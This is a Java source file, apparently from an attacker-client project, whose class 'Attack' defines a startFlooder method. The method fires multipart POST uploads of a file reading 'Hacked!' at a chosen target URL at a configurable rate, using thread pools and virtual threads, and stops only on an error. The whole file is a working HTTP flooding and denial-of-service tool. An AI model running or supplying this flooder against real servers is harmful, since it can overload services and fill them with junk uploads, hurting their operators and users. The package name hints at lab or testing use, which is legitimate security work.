package bit.attacker.client;

import lombok.Cleanup;
import lombok.val;
import org.apache.hc.client5.http.classic.methods.HttpPost;
import org.apache.hc.client5.http.entity.mime.HttpMultipartMode;
import org.apache.hc.client5.http.entity.mime.MultipartEntityBuilder;
import org.apache.hc.client5.http.impl.classic.HttpClientBuilder;
import org.apache.hc.core5.http.ContentType;

import java.nio.charset.StandardCharsets;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

public class Attack {
    public static void startFlooder(String target, int rate) throws Exception {
        @Cleanup val exec = Executors.newScheduledThreadPool(4);
        long nanosBetweenRequest = 1_000_000_000 / rate;
        val exceptionRef = new AtomicReference<Exception>(null);
        exec.scheduleAtFixedRate(() -> {
            Thread.ofVirtual().start(() -> {
                try {
                    val builder = MultipartEntityBuilder.create();
                    builder.setMode(HttpMultipartMode.STRICT);
                    builder.addBinaryBody("file", "Hacked!".getBytes(StandardCharsets.UTF_8), ContentType.TEXT_PLAIN, "test.txt");
                    @Cleanup val entity = builder.build();
                    @Cleanup val client = HttpClientBuilder.create().build();
                    val post = new HttpPost(target);
                    post.setEntity(entity);
                    client.execute(post, response -> {
                        System.out.printf("Response: %s\n", new String(response.getEntity().getContent().readAllBytes()));
                        return null;
                    });
                } catch (Exception e) {
                    exceptionRef.set(e);
                }
            });
        }, 0, nanosBetweenRequest, TimeUnit.NANOSECONDS);
        Exception e;
        while ((e = exceptionRef.get()) == null) {
            Thread.sleep(1);
        }
        throw e;
    }
}
